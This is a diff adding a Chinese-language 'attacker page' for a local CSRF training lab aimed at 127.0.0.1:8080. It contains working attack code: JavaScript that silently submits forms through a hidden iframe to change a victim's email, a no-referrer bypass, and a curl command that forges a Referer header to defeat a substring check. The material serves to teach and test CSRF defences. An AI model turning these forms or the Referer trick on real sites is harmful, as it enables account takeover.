@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>攻击者页面 · CSRF 演示</title>
+<!--
+  这个文件是 CSRF 场景的「攻击者页面」。
+
+  ⚠️ 两点必须说清楚：
+
+  ① 它是**静态 HTML**，不是 PHP —— 因为它模拟的是「部署在攻击者域名下的页面」，
+     跟靶站没有任何关系。
+
+  ② 靶场为了自包含，只能把它放在同一个域下。这会让浏览器的同源策略
+     在演示时失效（同域下 JS 可以读到靶站的响应和 token）。
+     真实攻击里攻击页面在另一个域，读不到任何东西。
+
+     但这**不影响本场景的结论**，因为真正决定 CSRF 能否成立的，
+     是「请求里有没有带上一个跨站页面拿不到的东西」——
+     这个性质与攻击页面放在哪里无关。
+     用 curl 直接发那个 POST，等价于浏览器提交表单。
+
+  ── 为什么表单可以自动提交 ──
+  浏览器提交表单只看 action 指向哪里，不看页面来自哪里；
+  提交时会自动带上目标站点的 Cookie。
+  这两条加起来就是 CSRF 的全部基础。
+-->
+<style>
+  body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 0;
+         background: #0b1020; color: #e5e7eb; line-height: 1.7; }
+  .wrap { max-width: 760px; margin: 0 auto; padding: 40px 24px 80px; }
+  h1 { font-size: 22px; margin: 0 0 6px; }
+  .sub { color: #9ca3af; font-size: 14px; margin-bottom: 28px; }
+  .card { background: #111827; border: 1px solid #1f2937; border-radius: 10px;
+          padding: 20px 22px; margin-bottom: 18px; }
+  h2 { font-size: 16px; margin: 0 0 12px; color: #f9fafb; }
+  p { font-size: 14px; color: #9ca3af; margin: 0 0 12px; }
+  code, pre { font-family: ui-monospace, Consolas, monospace; font-size: 12.5px; }
+  code { background: #1f2937; padding: 1px 5px; border-radius: 4px; color: #a5b4fc; }
+  pre { background: #0b1020; border: 1px solid #1f2937; border-radius: 8px;
+        padding: 12px 14px; overflow-x: auto; color: #cbd5e1; }
+  button { background: #dc2626; color: #fff; border: 0; border-radius: 7px;
+           padding: 10px 18px; font-size: 14px; cursor: pointer; margin: 0 8px 8px 0; }
+  button.alt { background: #374151; }
+  button:hover { filter: brightness(1.12); }
+  .warn { border-color: #7f1d1d; background: #1f0a0a; }
+  .warn h2 { color: #fca5a5; }
+  ul { font-size: 14px; color: #9ca3af; padding-left: 20px; margin: 0 0 12px; }
+  a { color: #60a5fa; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>🎁 恭喜！你中奖了 —— 点击领取</h1>
+  <div class="sub">这是一个「诱导页面」的示意。真实的攻击页面通常伪装成正常内容。</div>
+
+  <div class="card warn">
+    <h2>⚠️ 这个文件的作用与边界</h2>
+    <p>
+      这是 CSRF 场景的<b>攻击者页面</b>，模拟「部署在攻击者域名下」的页面。<br>
+      靶场为了自包含只能把它放在同一域下 —— 这会让同源策略在演示时失效，
+      但真正决定 CSRF 能否成立的性质（<b>请求里有没有带上跨站页面拿不到的东西</b>）
+      与页面放在哪里无关。
+    </p>
+    <p style="margin:0">
+      它只对本地靶场 <code>127.0.0.1:8080</code> 发请求。
+      <b>请勿修改成指向任何真实站点。</b>
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>发起攻击</h2>
+    <p>
+      下面三个按钮分别打向 low / medium / high 三档。
+      表单内容是「把受害者邮箱改成 <code>attacker@evil.example</code>」。
+    </p>
+
+    <button onclick="fire('low', false)">打 low 档</button>
+    <button onclick="fire('medium', false)">打 medium 档（带 Referer）</button>
+    <button class="alt" onclick="fire('medium', true)">打 medium 档（no-referrer）</button>
+    <button class="alt" onclick="fire('high', false)">打 high 档</button>
+
+    <p style="margin-top:14px">
+      第三个按钮给表单加了 <code>referrerpolicy="no-referrer"</code> ——
+      <b>这就是 medium 档第一个绕过点的完整实现</b>：
+      攻击者在自己页面上加一个属性，浏览器就不再发送 Referer。
+      「空 Referer 放行」因此等于把门开着。
+    </p>
+
+    <iframe name="sink" style="display:none" title="静默提交目标"></iframe>
+  </div>
+
+  <div class="card">
+    <h2>medium 档的第二个绕过点：域名包含</h2>
+    <p>
+      这个绕过<b>没法用 JS 实现</b> —— 因为 Referer 由浏览器自动填写，页面改不了它。
+      但攻击者根本不需要改它：
+    </p>
+    <ul>
+      <li>目标是 <code>bank.com</code></li>
+      <li>攻击者注册 <code>bank.com.evil.com</code></li>
+      <li>浏览器诚实地填上 Referer：<code>http://bank.com.evil.com/...</code></li>
+      <li>校验代码里的 <code>strpos($referer, 'bank.com') !== false</code> → 通过</li>
+    </ul>
+    <p style="margin-bottom:0">
+      靶场的 host 是 <code>127.0.0.1:8080</code>，没法真的注册这种域名，
+      所以用命令行直接构造这个头即可：
+    </p>
+    <pre>curl -X POST http://127.0.0.1:8080/csrf/medium.php \
+  -H "Referer: http://127.0.0.1:8080.evil.example/" \
+  -d "email=attacker@evil.example"</pre>
+  </div>
+
+  <div class="card">
+    <h2>为什么保存了却看不到结果</h2>
+    <p style="margin:0">
+      表单提交到隐藏的 iframe 里 —— 这正是 CSRF 的特征：
+      <b>攻击者只能「发请求」，读不到响应</b>（同源策略挡着）。<br>
+      要确认攻击效果，回到靶站页面看「当前状态」里的邮箱。
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>回到靶场</h2>
+    <p style="margin:0">
+      <a href="/csrf/low.php">low 档</a> ·
+      <a href="/csrf/medium.php">medium 档</a> ·
+      <a href="/csrf/high.php">high 档</a>
+    </p>
+  </div>
+
+</div>
+
+<script>
+  // 把表单提交到隐藏 iframe —— 攻击者读不到响应，也不需要读到
+  function fire(level, noReferrer) {
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '/' + 'csrf/' + level + '.php';
+    form.target = 'sink';
+    if (noReferrer) {
+      form.setAttribute('referrerpolicy', 'no-referrer');
+    }
+
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'email';
+    input.value = 'attacker@evil.example';
+    form.appendChild(input);
+
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+
+    alert('请求已发出（' + level + ' 档' + (noReferrer ? '，不带 Referer' : '') + '）。\n'
+        + '攻击者读不到响应 —— 请回靶站页面看「当前状态」里的邮箱有没有被改掉。');
+  }
+</script>
+</body>
+</html>
